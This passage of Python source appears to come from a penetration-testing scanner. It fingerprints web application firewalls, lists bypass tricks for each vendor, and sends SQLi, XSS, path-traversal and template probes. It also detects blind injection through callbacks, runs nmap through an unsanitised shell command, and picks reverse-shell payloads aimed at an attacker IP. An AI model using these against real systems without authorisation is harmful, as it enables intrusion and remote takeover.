                "x-akamai-transformed": "",
                "x-akamai-request-id": "",
            },
            status_codes=[403],
            cookie_patterns=[re.compile(r'ak_bmsc', re.I), re.compile(r'bm_sz', re.I),
                           re.compile(r'_abck', re.I)],
            body_patterns=[
                re.compile(r'reference #[0-9a-f.]+', re.I),
            ],
        ),
        WAFSignature(
            name="Sucuri",
            headers={
                "server": "sucuri",
                "x-sucuri-id": "",
                "x-sucuri-cache": "",
            },
            status_codes=[403],
            body_patterns=[
                re.compile(r'sucuri website firewall.*access denied', re.I),
                re.compile(r'cloudproxy@sucuri\.net', re.I),
            ],
        ),
        WAFSignature(
            name="Wordfence",
            headers={
                "x-wordfence-blocked": "",
                "x-wordfence-action": "",
            },
            status_codes=[403, 503],
            cookie_patterns=[re.compile(r'wfwaf-authcookie', re.I), re.compile(r'wfvt_', re.I)],
            body_patterns=[
                re.compile(r'Generated by Wordfence', re.I),
                re.compile(r'Your access.*has been limited', re.I),
                re.compile(r'Wordfence Web Application Firewall', re.I),
            ],
        ),
        WAFSignature(
            name="Azure Front Door",
            headers={
                "x-azure-ref": "",
            },
            status_codes=[403],
            body_patterns=[
                re.compile(r'Microsoft-Azure-Application-Gateway', re.I),
            ],
        ),
        WAFSignature(
            name="Google Cloud Armor",
            headers={
                "server": "gse",
            },
            status_codes=[403, 404],
            body_patterns=[
                re.compile(r'Request blocked by Cloud Armor', re.I),
                re.compile(r'Access Denied.*Cloud Armor', re.I),
            ],
        ),
        WAFSignature(
            name="Barracuda",
            headers={
                "server": "barracuda",
                "x-barracuda-url": "",
            },
            status_codes=[403],
            cookie_patterns=[re.compile(r'barra_counter_session', re.I)],
            body_patterns=[re.compile(r'barracuda', re.I)],
        ),
        WAFSignature(
            name="Citrix NetScaler",
            headers={
                "server": "netscaler",
                "vi-id": "",
            },
            status_codes=[403],
            cookie_patterns=[re.compile(r'ns_af=', re.I), re.compile(r'citrix_ns_id', re.I),
                           re.compile(r'NSC_', re.I)],
            body_patterns=[
                re.compile(r'The requested URL was rejected.*consult.*administrator', re.I),
            ],
        ),
        WAFSignature(
            name="DDoS-Guard",
            headers={
                "server": "ddos-guard",
            },
            status_codes=[403, 429],
            cookie_patterns=[re.compile(r'__ddg1_', re.I), re.compile(r'__ddgid', re.I)],
            body_patterns=[re.compile(r'ddos-guard', re.I)],
        ),
        WAFSignature(
            name="FortiWeb",
            headers={
                "server": "fortigate|fortiweb",
                "x-powered-by": "fortiweb",
            },
            status_codes=[403],
            cookie_patterns=[re.compile(r'FORTIWAFSID', re.I)],
            body_patterns=[re.compile(r'web filter violation', re.I), re.compile(r'fortiweb', re.I)],
        ),
        WAFSignature(
            name="Palo Alto Networks",
            headers={
                "x-phx": "",
            },
            status_codes=[403],
            body_patterns=[
                re.compile(r'Virus/Spyware Download Blocked', re.I),
                re.compile(r'Palo Alto', re.I),
            ],
        ),
        WAFSignature(
            name="Sophos WAF",
            headers={
                "x-sophos-waf-id": "",
            },
            status_codes=[403],
            cookie_patterns=[re.compile(r'sophos_waf_id', re.I)],
            body_patterns=[
                re.compile(r'UTM Web Protection', re.I),
                re.compile(r'Sophos Firewall', re.I),
            ],
        ),
        WAFSignature(
            name="Fastly",
            headers={
                "via": "fastly",
                "x-served-by": "cache-.*-fastly",
            },
            status_codes=[403],
        ),
        WAFSignature(
            name="Varnish",
            headers={
                "server": "varnish",
                "x-varnish": "",
                "via": "varnish",
            },
            status_codes=[403],
        ),
        WAFSignature(
            name="LiteSpeed",
            headers={
                "server": "litespeed",
                "x-litespeed-cache": "",
            },
            status_codes=[403],
            body_patterns=[re.compile(r'LiteSpeed', re.I), re.compile(r'Access forbidden by rule', re.I)],
        ),
        WAFSignature(
            name="Generic WAF",
            headers={},
            status_codes=[403, 406, 429],
            body_patterns=[
                re.compile(r'request.*(blocked|rejected|filtered).*by', re.I),
                re.compile(r'web.*(firewall|application firewall|waf)', re.I),
                re.compile(r'malicious.*request|suspicious.*activity|attack.*detected', re.I),
            ],
        ),
    ]
    
    # WAF-specific bypass techniques
    BYPASS_TECHNIQUES: dict[str, list[str]] = {
        "Cloudflare": [
            "Unicode encoding (\\u0027 instead of ')",
            "Double URL encoding (%2527 instead of %27)",
            "Mixed case keywords (uNiOn instead of UNION)",
            "Alternative space characters (\\u00A0)",
            "Comment-based obfuscation (/**/)",
        ],
        "AWS WAF": [
            "Unicode normalization bypasses",
            "Character set encoding variations",
            "Request method variations",
            "Content-Type manipulation",
        ],
        "Imperva": [
            "Parameter pollution",
            "HTTP verb tampering",
            "Custom header injection",
            "Encoding combinations",
        ],
        "F5 BIG-IP": [
            "Request smuggling techniques",
            "HTTP/1.0 downgrade",
            "Custom User-Agent strings",
        ],
        "ModSecurity": [
            "Comment-based SQL obfuscation (/**/)",
            "Case sensitivity exploits",
            "Regex pattern bypasses",
            "Alternative operators",
        ],
        "Akamai": [
            "IP-based bypasses",
            "Origin server direct access",
            "Cache poisoning techniques",
        ],
        "Azure Front Door": [
            "Case variations for SQL keywords",
            "Parameter pollution (duplicate params)",
            "Unicode encoding variations",
            "CRLF injection in headers",
        ],
        "Google Cloud Armor": [
            "Advanced request smuggling",
            "Complex encoding combinations",
            "Custom header injection (X-Forwarded-For)",
            "Path normalization bypasses",
        ],
        "Wordfence": [
            "Alternative SQL comment syntax (/*#*/)",
            "Base64 payload encoding",
            "PHP variable manipulation",
            "HTTP parameter pollution",
        ],
        "Generic WAF": [
            "Double URL encoding",
            "Unicode encoding",
            "Mixed case obfuscation",
            "Comment insertion",
            "Parameter pollution",
            "HTTP verb tampering",
        ],
    }
    
    @classmethod
    def detect_from_response(cls, headers: dict[str, str], body: str, 
                            status_code: int, cookies: str = "") -> WAFDetectionResult:
        """Detect WAF from HTTP response."""
        best_match = {
            "name": "Unknown",
            "confidence": 0,
            "evidence": [],
        }
        
        # Check for captcha
        captcha_detected = ""
        if "challenges.cloudflare.com/turnstile" in body:
            captcha_detected = "Cloudflare Turnstile"
        elif "google.com/recaptcha" in body:
            captcha_detected = "Google reCAPTCHA"
        elif "hcaptcha.com" in body:
            captcha_detected = "hCaptcha"
        
        # Check each signature
        for sig in cls.WAF_SIGNATURES:
            confidence = 0
            evidence = []
            
            # Check headers
            for header_name, pattern in sig.headers.items():
                header_value = headers.get(header_name.lower(), "")
                if header_value:
                    if isinstance(pattern, str):
                        if pattern == "" or pattern.lower() in header_value.lower():
                            confidence += 30
                            evidence.append(f"Header {header_name}: {header_value[:50]}")
                    elif isinstance(pattern, re.Pattern):
                        if pattern.search(header_value):
                            confidence += 30
                            evidence.append(f"Header {header_name} matches pattern")
            
            # Check status codes
            if sig.status_codes and status_code in sig.status_codes:
                confidence += 20
                evidence.append(f"Status code: {status_code}")
            
            # Check cookies
            if sig.cookie_patterns and cookies:
                for pattern in sig.cookie_patterns:
                    if pattern.search(cookies):
                        confidence += 25
                        evidence.append(f"Cookie pattern match: {pattern.pattern[:30]}")
            
            # Check body patterns
            if sig.body_patterns:
                for pattern in sig.body_patterns:
                    if pattern.search(body):
                        confidence += 25
                        evidence.append(f"Body pattern match: {pattern.pattern[:40]}")
            
            # Update best match
            if confidence > best_match["confidence"]:
                best_match = {
                    "name": sig.name,
                    "confidence": confidence,
                    "evidence": evidence,
                }
        
        detected = best_match["confidence"] > 40
        bypass_techniques = cls.BYPASS_TECHNIQUES.get(
            best_match["name"], cls.BYPASS_TECHNIQUES["Generic WAF"]
        )
        
        return WAFDetectionResult(
            detected=detected,
            waf_type=best_match["name"] if detected else "Unknown",
            confidence=best_match["confidence"] / 100.0,
            evidence=best_match["evidence"],
            bypass_techniques=bypass_techniques,
            captcha_detected=captcha_detected,
        )
    
    @classmethod
    def get_probe_payloads(cls) -> list[str]:
        """Get payloads to probe for WAF detection."""
        return [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "UNION SELECT 1,2,3--",
            "{{7*7}}",
        ]
    
    @classmethod
    def get_supported_wafs(cls) -> list[str]:
        """Get list of supported WAF types."""
        return [sig.name for sig in cls.WAF_SIGNATURES if sig.name != "Generic WAF"]


class ActiveScanner:
    """Active scanner for real target reconnaissance and vulnerability testing."""
    
    # Payload mode constants for backward compatibility
    MODE_QUICK = "quick"
    MODE_STANDARD = "standard"
    MODE_THOROUGH = "thorough"
    MODE_AGGRESSIVE = "aggressive"
    
    def __init__(
        self, 
        timeout: int = 10, 
        verify_ssl: bool = False, 
        verbose: bool = True,
        payload_mode: str = "standard",
        oob_enabled: bool = True,
        oob_host: str = "0.0.0.0",
        oob_port: int = 8888,
        oob_domain: str = None,
        oob_external_service: str = None,  # "interact.sh" or "burpcollaborator"
        pd_tools_enabled: bool = True,  # Enable ProjectDiscovery tools
        pd_rate_limit: int = 150,  # Rate limit for PD tools
        pd_threads: int = 25,  # Thread count for PD tools
        nuclei_templates_path: str = None,  # Custom nuclei templates path
    ):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.payload_mode = payload_mode
        self._baselines: dict[str, BaselineResponse] = {}  # Cache baselines per endpoint
        self._protected_endpoints: list[str] = []  # Endpoints requiring auth
        self._filtered_false_positives: list[dict] = []  # Track what was filtered
        self._detected_waf: WAFDetectionResult | None = None  # Detected WAF for bypass payloads
        
        # OOB Server configuration
        self._oob_enabled = oob_enabled and HAS_OOB_SERVER
        self._oob_server: OOBServer | None = None
        self._oob_host = oob_host
        self._oob_port = oob_port
        self._oob_domain = oob_domain
        self._oob_external_service = oob_external_service
        self._blind_detector: BlindInjectionDetector | None = None
        
        # Initialize Dynamic Payload Engine
        self._payload_engine = None
        if HAS_DYNAMIC_PAYLOADS:
            mode_map = {
                "quick": PayloadMode.QUICK,
                "standard": PayloadMode.STANDARD,
                "thorough": PayloadMode.THOROUGH,
                "aggressive": PayloadMode.AGGRESSIVE,
            }
            self._payload_engine = DynamicPayloadEngine(PayloadContext(
                mode=mode_map.get(payload_mode, PayloadMode.STANDARD)
            ))
            self._log(f"[Payload Engine] Dynamic Payload Engine: ENABLED (mode: {payload_mode})")
        
        # Initialize MISP Warning List Filter for false positive reduction
        if HAS_WARNING_FILTER:
            self._warning_filter = MISPWarningListFilter()
            self._log("[FP Filter] MISP Warning List Filter: ENABLED")
        else:
            self._warning_filter = None
        
        if HAS_REQUESTS:
            self.session = requests.Session()
            # Set adapter with lower max retries for faster failure
            adapter = requests.adapters.HTTPAdapter(max_retries=1)
            self.session.mount('http://', adapter)
            self.session.mount('https://', adapter)
        else:
            self.session = None
        
        # Initialize ProjectDiscovery Tools (nuclei, subfinder, httpx, etc.)
        self._pd_tools_enabled = pd_tools_enabled and HAS_PD_TOOLS
        self._pd_tools: ProjectDiscoveryTools | None = None
        if self._pd_tools_enabled and HAS_PD_TOOLS:
            self._pd_tools = ProjectDiscoveryTools(
                timeout=timeout * 30,  # PD tools need more time
                rate_limit=pd_rate_limit,
                threads=pd_threads,
                verbose=verbose,
                nuclei_templates_path=nuclei_templates_path
            )
            available = self._pd_tools.get_available_tools()
            enabled_tools = [k for k, v in available.items() if v]
            if enabled_tools:
                self._log(f"[PD Tools] Available: {', '.join(enabled_tools)}")
            else:
                self._log("[PD Tools] No ProjectDiscovery tools found in PATH")
        elif pd_tools_enabled and not HAS_PD_TOOLS:
            self._log("[PD Tools] Module not available (import failed)")
    
    def set_payload_mode(self, mode: str):
        """Change payload generation mode dynamically."""
        self.payload_mode = mode
        if self._payload_engine and HAS_DYNAMIC_PAYLOADS:
            mode_map = {
                "quick": PayloadMode.QUICK,
                "standard": PayloadMode.STANDARD,
                "thorough": PayloadMode.THOROUGH,
                "aggressive": PayloadMode.AGGRESSIVE,
            }
            self._payload_engine.context.mode = mode_map.get(mode, PayloadMode.STANDARD)
            self._log(f"[Payload Engine] Mode changed to: {mode}")
    
    # ========== OOB Server Management ==========
    
    def start_oob_server(self) -> bool:
        """Start the OOB callback server for blind vulnerability detection."""
        if not self._oob_enabled or not HAS_OOB_SERVER:
            self._log("[OOB] OOB Server not available")
            return False
        
        if self._oob_server and self._oob_server.is_running:
            self._log("[OOB] Server already running")
            return True
        
        try:
            self._oob_server = OOBServer(
                host=self._oob_host,
                port=self._oob_port,
                domain=self._oob_domain,
                external_service=self._oob_external_service
            )
            
            if self._oob_server.start():
                self._blind_detector = BlindInjectionDetector(self._oob_server)
                self._log(f"[OOB] Server started on {self._oob_host}:{self._oob_port}")
                return True
            else:
                self._log("[OOB] Failed to start server")
                return False
        except Exception as e:
            self._log(f"[OOB] Error starting server: {e}")
            return False
    
    def stop_oob_server(self):
        """Stop the OOB callback server."""
        if self._oob_server:
            self._oob_server.stop()
            self._oob_server = None
            self._blind_detector = None
            self._log("[OOB] Server stopped")
    
    def get_oob_callback_url(self, token: str) -> str:
        """Get OOB callback URL for a token."""
        if self._oob_server:
            return self._oob_server.get_callback_url(token)
        return ""
    
    def get_oob_domain(self) -> str:
        """Get OOB domain for DNS-based detection."""
        if self._oob_server:
            return self._oob_server.domain
        if self._oob_external_service == "interact.sh":
            return "oast.pro"
        if self._oob_external_service == "burpcollaborator":
            return "burpcollaborator.net"
        return self._oob_domain or f"{self._oob_host}:{self._oob_port}"
    
    def generate_oob_token(self, vuln_type: str, target_url: str, payload: str = "") -> str:
        """Generate OOB token for tracking callbacks."""
        if self._oob_server:
            return self._oob_server.generate_token(vuln_type, target_url, payload)
        return ""
    
    def check_oob_callback(self, token: str) -> tuple[bool, list]:
        """Check if OOB callback was received."""
        if self._oob_server:
            return self._oob_server.check_callback(token)
        return False, []
    
    def wait_for_oob_callback(self, token: str, timeout: float = 10.0) -> tuple[bool, list]:
        """Wait for OOB callback with timeout."""
        if self._oob_server:
            return self._oob_server.wait_for_callback(token, timeout)
        return False, []
    
    # ========== Blind Vulnerability Testing ==========
    
    def get_blind_payloads(self, vuln_type: str) -> list[dict]:
        """
        Get blind vulnerability payloads with OOB callbacks.
        
        Args:
            vuln_type: "sqli", "rce", "xxe", "ssrf"
        
        Returns:
            List of payload dicts with 'payload', 'type', and metadata
        """
        if not self._blind_detector:
            return []
        
        oob_domain = self.get_oob_domain()
        
        if vuln_type == "sqli":
            return self._blind_detector.get_blind_sqli_payloads(oob_domain)
        elif vuln_type == "rce":
            return self._blind_detector.get_blind_rce_payloads(oob_domain)
        elif vuln_type == "xxe":
            return self._blind_detector.get_blind_xxe_payloads(oob_domain)
        else:
            return []
    
    def test_blind_vulnerability(
        self,
        endpoint: EndpointInfo,
        param: str,
        vuln_type: str,
        baseline_ms: float = None
    ) -> list[VulnerabilityResult]:
        """
        Test for blind vulnerabilities using time-based and OOB techniques.
        
        Args:
            endpoint: Target endpoint
            param: Parameter to test
            vuln_type: Type of vulnerability (sqli, rce, xxe)
            baseline_ms: Baseline response time in ms
        
        Returns:
            List of confirmed vulnerabilities
        """
        results = []
        payloads = self.get_blind_payloads(vuln_type)
        
        if not payloads:
            return results
        
        self._log(f"[Blind] Testing {len(payloads)} {vuln_type.upper()} payloads")
        
        for payload_info in payloads:
            payload = payload_info["payload"]
            payload_type = payload_info["type"]
            
            # Generate OOB token if needed
            oob_token = None
            if payload_type == "oob" and self._oob_server:
                oob_token = self.generate_oob_token(
                    vuln_type=f"blind_{vuln_type}",
                    target_url=endpoint.url,
                    payload=payload
                )
                # Replace placeholder domain with actual OOB domain
                oob_domain = self.get_oob_domain()
                if "attacker.com" in payload:
                    payload = payload.replace("attacker.com", oob_domain)
            
            # Make request with payload
            try:
                import time
                start_time = time.time()
                
                # Build test URL with payload in the specified parameter
                test_url = f"{endpoint.url}?{param}={urllib.parse.quote(payload)}"
                
                response = self._make_request("GET", test_url)
                response_ms = (time.time() - start_time) * 1000
                
                # Verify based on type
                is_vulnerable = False
                confidence = 0.0
                evidence = ""
                
                if payload_type == "time":
                    expected_delay = 5000  # 5 seconds
                    if baseline_ms:
                        delay = response_ms - baseline_ms
                        if delay >= expected_delay * 0.8:
                            is_vulnerable = True
                            confidence = min(0.95, 0.6 + (delay / expected_delay) * 0.3)
                            evidence = f"Time delay: {delay:.0f}ms (expected: {expected_delay}ms)"
                
                elif payload_type == "oob" and oob_token:
                    # Wait for callback
                    verified, callbacks = self.wait_for_oob_callback(oob_token, timeout=10.0)
                    if verified:
                        is_vulnerable = True
                        confidence = 0.95  # OOB is highly reliable
                        evidence = f"OOB callback received"
                        if callbacks:
                            evidence += f" from {callbacks[0].source_ip}"
                
                if is_vulnerable:
                    results.append(VulnerabilityResult(
                        vuln_type=f"blind_{vuln_type}",
                        target_url=endpoint.url,
                        payload=payload,
                        response=response,
                        is_vulnerable=True,
                        confidence=confidence,
                        evidence=evidence,
                        cvss_score=8.0 if vuln_type in ["rce", "sqli"] else 6.5,
                        validation_method=payload_type,
                    ))
                    self._log(f"    [!] BLIND {vuln_type.upper()} CONFIRMED: {evidence}")
                    
            except Exception as e:
                if self.verbose:
                    self._log(f"    [!] Error testing blind {vuln_type}: {e}")
        
        return results
    
    # ========== End OOB Methods ==========
    
    # ========== Network Reconnaissance (Nmap Arsenal) ==========
    
    def run_network_recon(
        self, 
        target: str,
        scan_type: str = "comprehensive",
        ports: str = None,
        nse_categories: list[str] = None
    ) -> dict:
        """
        Run network reconnaissance using Nmap Arsenal.
        
        Args:
            target: IP address or hostname
            scan_type: "quick", "comprehensive", "stealth", "vuln", "version"
            ports: Port specification (e.g., "80,443,8080" or "1-1000")
            nse_categories: NSE script categories to run
        
        Returns:
            Dict with scan results including open ports, services, vulns
        """
        if not HAS_NMAP_ARSENAL:
            self._log("[Nmap] Nmap Arsenal not available")
            return {"error": "Nmap Arsenal not installed"}
        
        try:
            arsenal = NmapArsenal()
            
            # Map scan type strings to enum
            scan_type_map = {
                "quick": ScanType.QUICK,
                "comprehensive": ScanType.COMPREHENSIVE,
                "stealth": ScanType.STEALTH,
                "vuln": ScanType.VULN,
                "version": ScanType.VERSION,
                "full": ScanType.FULL,
                "web": ScanType.WEB,
            }
            
            scan_enum = scan_type_map.get(scan_type.lower(), ScanType.COMPREHENSIVE)
            
            # Build nmap command
            cmd = arsenal.build_command(
                target=target,
                scan_type=scan_enum,
                ports=ports,
                nse_categories=nse_categories
            )
            
            self._log(f"[Nmap] Running: {cmd}")
            
            # Execute scan (requires nmap installed)
            import subprocess
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            # Parse results
            return {
                "command": cmd,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "target": target,
                "scan_type": scan_type
            }
            
        except Exception as e:
            self._log(f"[Nmap] Error: {e}")
            return {"error": str(e)}
    
    def get_available_nse_scripts(self) -> list[str]:
        """Get list of available NSE scripts from arsenal."""
        if not HAS_NMAP_ARSENAL:
            return []
        try:
            arsenal = NmapArsenal()
            return arsenal.scripts
        except:
            return []
    
    # ========== ProjectDiscovery Tools Integration ==========
    
    def get_pd_tools_status(self) -> dict[str, bool]:
        """Get status of available ProjectDiscovery tools."""
        if not self._pd_tools:
            return {"enabled": False, "tools": {}}
        return {
            "enabled": True,
            "tools": self._pd_tools.get_available_tools()
        }
    
    def pd_discover_subdomains(
        self,
        domain: str,
        recursive: bool = False,
        all_sources: bool = False
    ) -> list:
        """
        Discover subdomains using subfinder.
        
        Args:
            domain: Target domain
            recursive: Use recursive-capable sources only
            all_sources: Use all available sources (slower)
            
        Returns:
            List of SubdomainResult objects
        """
        if not self._pd_tools or not self._pd_tools.is_tool_available("subfinder"):
            self._log("[PD Tools] subfinder not available")
            return []
        
        self._log(f"[PD Tools] Discovering subdomains for {domain}...")
        results = self._pd_tools.discover_subdomains(
            domain=domain,
            recursive=recursive,
            all_sources=all_sources
        )
        self._log(f"[PD Tools] Found {len(results)} subdomains")
        return results
    
    def pd_scan_ports(
        self,
        targets: list[str],
        ports: str = "top-100",
        service_detection: bool = False
    ) -> list:
        """
        Scan ports using naabu.
        
        Args:
            targets: List of hosts/IPs
            ports: Port specification (80,443 or top-100 or full)
            service_detection: Identify services by port number
            
        Returns:
            List of PortResult objects
        """
        if not self._pd_tools or not self._pd_tools.is_tool_available("naabu"):
            self._log("[PD Tools] naabu not available")
            return []
        
        self._log(f"[PD Tools] Scanning ports on {len(targets)} targets...")
        results = self._pd_tools.scan_ports(
            targets=targets,
            ports=ports,
            service_detection=service_detection
        )
        self._log(f"[PD Tools] Found {len(results)} open ports")
        return results
    
    def pd_probe_http(
        self,
        targets: list[str],
        tech_detect: bool = True,
        follow_redirects: bool = True
    ) -> list:
        """
        Probe HTTP services using httpx.
        
        Args:
            targets: List of URLs/hosts
            tech_detect: Enable technology detection
            follow_redirects: Follow HTTP redirects
            
        Returns:
            List of HttpProbeResult objects
        """
        if not self._pd_tools or not self._pd_tools.is_tool_available("httpx"):
            self._log("[PD Tools] httpx not available")
            return []
        
        self._log(f"[PD Tools] Probing HTTP services on {len(targets)} targets...")
        results = self._pd_tools.probe_http(
            targets=targets,
            tech_detect=tech_detect,
            follow_redirects=follow_redirects
        )
        self._log(f"[PD Tools] Found {len(results)} live HTTP services")
        return results
    
    def pd_crawl(
        self,
        targets: list[str],
        depth: int = 3,
        js_crawl: bool = True,
        headless: bool = False
    ) -> list:
        """
        Crawl websites using katana.
        
        Args:
            targets: List of URLs to crawl
            depth: Maximum crawl depth
            js_crawl: Parse JavaScript files
            headless: Use headless browser
            
        Returns:
            List of CrawlResult objects
        """
        if not self._pd_tools or not self._pd_tools.is_tool_available("katana"):
            self._log("[PD Tools] katana not available")
            return []
        
        self._log(f"[PD Tools] Crawling {len(targets)} targets...")
        results = self._pd_tools.crawl(
            targets=targets,
            depth=depth,
            js_crawl=js_crawl,
            headless=headless
        )
        self._log(f"[PD Tools] Discovered {len(results)} URLs")
        return results
    
    def pd_scan_vulnerabilities(
        self,
        targets: list[str],
        template_tags: list[str] | None = None,
        severity: list[str] | None = None,
        automatic_scan: bool = False
    ) -> list:
        """
        Scan for vulnerabilities using nuclei.
        
        Args:
            targets: List of URLs to scan
            template_tags: Filter templates by tags (e.g., cve, rce, sqli)
            severity: Filter by severity (critical, high, medium, low, info)
            automatic_scan: Use automatic web scan
            
        Returns:
            List of NucleiResult objects
        """
        if not self._pd_tools or not self._pd_tools.is_tool_available("nuclei"):
            self._log("[PD Tools] nuclei not available")
            return []
        
        self._log(f"[PD Tools] Scanning {len(targets)} targets with nuclei...")
        severity = severity or ["critical", "high", "medium"]
        results = self._pd_tools.scan_vulnerabilities(
            targets=targets,
            template_tags=template_tags,
            severity=severity,
            automatic_scan=automatic_scan
        )
        self._log(f"[PD Tools] Found {len(results)} vulnerabilities")
        return results
    
    def pd_scan_cves(
        self,
        targets: list[str],
        cve_ids: list[str] | None = None,
        year: int | None = None
    ) -> list:
        """
        Scan for specific CVEs using nuclei.
        
        Args:
            targets: List of URLs to scan
            cve_ids: Specific CVE IDs to test
            year: Test CVEs from specific year
            
        Returns:
            List of NucleiResult objects
        """
        if not self._pd_tools or not self._pd_tools.is_tool_available("nuclei"):
            self._log("[PD Tools] nuclei not available")
            return []
        
        self._log(f"[PD Tools] Scanning for CVEs on {len(targets)} targets...")
        results = self._pd_tools.scan_cves(
            targets=targets,
            cve_ids=cve_ids,
            year=year
        )
        self._log(f"[PD Tools] Found {len(results)} CVE matches")
        return results
    
    def pd_search_cves(
        self,
        query: str = "",
        product: str | None = None,
        severity: list[str] | None = None,
        kev_only: bool = False,
        has_poc: bool = False
    ) -> list:
        """
        Search CVE database using vulnx.
        
        Args:
            query: Search query
            product: Filter by product name
            severity: Filter by severity levels
            kev_only: Only KEV (Known Exploited Vulnerabilities)
            has_poc: Only CVEs with proof of concept
            
        Returns:
            List of CVEResult objects
        """
        if not self._pd_tools or not self._pd_tools.is_tool_available("vulnx"):
            self._log("[PD Tools] vulnx not available")
            return []
        
        self._log(f"[PD Tools] Searching CVE database...")
        results = self._pd_tools.search_cves(
            query=query,
            product=product,
            severity=severity,
            kev_only=kev_only,
            has_poc=has_poc
        )
        self._log(f"[PD Tools] Found {len(results)} CVEs")
        return results
    
    def pd_full_recon(
        self,
        domain: str,
        include_ports: bool = True,
        include_http_probe: bool = True,
        include_crawl: bool = True
    ) -> dict:
        """
        Perform full reconnaissance using ProjectDiscovery tools.
        
        Pipeline: subfinder → naabu → httpx → katana
        
        Args:
            domain: Target domain
            include_ports: Run port scan
            include_http_probe: Run HTTP probing
            include_crawl: Run web crawling
            
        Returns:
            Dict with all reconnaissance data
        """
        if not self._pd_tools:
            self._log("[PD Tools] Not available")
            return {"error": "PD Tools not available"}
        
        self._log(f"[PD Tools] Starting full recon on {domain}...")
        return self._pd_tools.full_recon(
            domain=domain,
            include_ports=include_ports,
            include_http_probe=include_http_probe,
            include_crawl=include_crawl
        )
    
    def pd_vuln_scan_pipeline(
        self,
        targets: list[str],
        severity: list[str] | None = None,
        tags: list[str] | None = None,
        crawl_first: bool = True
    ) -> dict:
        """
        Full vulnerability scanning pipeline.
        
        Pipeline: httpx → katana → nuclei
        
        Args:
            targets: Initial target URLs
            severity: Minimum severity to report
            tags: Template tags to use
            crawl_first: Crawl before scanning
            
        Returns:
            Dict with all vulnerability findings
        """
        if not self._pd_tools:
            self._log("[PD Tools] Not available")
            return {"error": "PD Tools not available"}
        
        self._log(f"[PD Tools] Starting vuln scan pipeline on {len(targets)} targets...")
        return self._pd_tools.vuln_scan_pipeline(
            targets=targets,
            severity=severity,
            tags=tags,
            crawl_first=crawl_first
        )
    
    # ========== Reverse Shell Generation ==========
    
    def generate_reverse_shell_payloads(
        self, 
        attacker_ip: str, 
        attacker_port: int = 4444,
        shell_types: list[str] = None
    ) -> dict[str, str]:
        """
        Generate reverse shell payloads for RCE exploitation.
        
        Args:
            attacker_ip: Attacker's IP address for callback
            attacker_port: Port for reverse shell connection
            shell_types: Specific shell types to generate (None = all)
        
        Returns:
            Dict mapping shell type to payload string
        """
        if not HAS_REVERSE_SHELLS:
            self._log("[RevShell] Reverse shell generator not available")
            return {}
        
        try:
            all_shells = generate_reverse_shells(attacker_ip, attacker_port)
            
            if shell_types:
                return {k: v for k, v in all_shells.items() if k in shell_types}
            return all_shells
            
        except Exception as e:
            self._log(f"[RevShell] Error generating shells: {e}")
            return {}
    
    def get_reverse_shell_for_target(
        self,
        tech_stack: TechStack,
        attacker_ip: str,
        attacker_port: int = 4444
    ) -> dict[str, str]:
        """
        Get recommended reverse shells based on target tech stack.
        
        Args:
            tech_stack: Detected TechStack object
            attacker_ip: Attacker's IP address
            attacker_port: Port for reverse shell
        
        Returns:
            Dict of recommended shell types and payloads
        """
        if not HAS_REVERSE_SHELLS:
            return {}
        
        all_shells = self.generate_reverse_shell_payloads(attacker_ip, attacker_port)
        recommended = {}
        
        # Map tech stack to recommended shells
        language = tech_stack.language.lower() if tech_stack.language else ""
        framework = tech_stack.framework.lower() if tech_stack.framework else ""
        server = tech_stack.server.lower() if tech_stack.server else ""
        
        # Python-based targets
        if "python" in language or "flask" in framework or "django" in framework:
            if "python" in all_shells:
                recommended["python"] = all_shells["python"]
            if "python_short" in all_shells:
                recommended["python_short"] = all_shells["python_short"]
        
        # PHP-based targets  
        if "php" in language or "laravel" in framework or "wordpress" in framework:
            if "php" in all_shells:
                recommended["php"] = all_shells["php"]
            if "php_system" in all_shells:
                recommended["php_system"] = all_shells["php_system"]
        
        # Node.js targets
        if "node" in language or "express" in framework or "next" in framework:
            if "nodejs" in all_shells:
                recommended["nodejs"] = all_shells["nodejs"]
        
        # Ruby targets
        if "ruby" in language or "rails" in framework:
            if "ruby" in all_shells:
                recommended["ruby"] = all_shells["ruby"]
        
        # Java targets (Groovy works in Java environments)
        if "java" in language or "spring" in framework or "tomcat" in server:
            if "groovy" in all_shells:
                recommended["groovy"] = all_shells["groovy"]
        
        # Generic *nix shells (always include as fallback)
        if "bash_tcp" in all_shells:
            recommended["bash_tcp"] = all_shells["bash_tcp"]
        if "nc_mkfifo" in all_shells:
            recommended["nc_mkfifo"] = all_shells["nc_mkfifo"]
        
        # Windows targets
        if "windows" in server or "iis" in server or "asp" in language:
            if "powershell" in all_shells:
                recommended["powershell"] = all_shells["powershell"]
            if "powershell_base64" in all_shells:
                recommended["powershell_base64"] = all_shells["powershell_base64"]
        
        return recommended if recommended else all_shells
    
    # ========== End Network Recon Methods ==========
    
    def _log(self, message: str):
        """Print verbose log."""
        if self.verbose:
            print(f"    {message}")
    
    def _get_waf_bypass_payloads(self, original_payload: str, attack_type: str = "generic") -> list[str]:
        """
        Generate WAF bypass variations for a payload.
        
        Uses Dynamic Payload Engine if available, otherwise falls back to basic encoding.
        
        Args:
            original_payload: The original attack payload
            attack_type: Type of attack (sqli, xss, etc.)
        
        Returns:
            List of bypass payload variations including original
        """
        payloads = [original_payload]
        
        # Use Dynamic Payload Engine if available
        if self._payload_engine and HAS_DYNAMIC_PAYLOADS:
            waf_type = ""
            if self._detected_waf and self._detected_waf.detected:
                waf_type = self._detected_waf.waf_type
                self._payload_engine.set_context(waf_type=waf_type)
            
            # Get WAF bypass payloads from dynamic engine
            generated = WAFBypassEngine.get_bypass_payloads(
                original_payload,
                waf_type or "generic",
                max_variants=self._get_payload_limit()
            )
            payloads.extend([g.raw for g in generated])
        else:
            # Fallback to old method
            if self._detected_waf and self._detected_waf.detected:
                waf_bypasses = WAFBypasses.get_waf_specific_bypasses(
                    self._detected_waf.waf_type, 
                    original_payload
                )
                payloads.extend(waf_bypasses)
            
            payloads.extend(PayloadEncoder.generate_bypass_variations(original_payload, attack_type))
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)
        
        return unique_payloads[:self._get_payload_limit()]
    
    def _get_payload_limit(self) -> int:
        """Get payload limit based on current mode."""
        limits = {
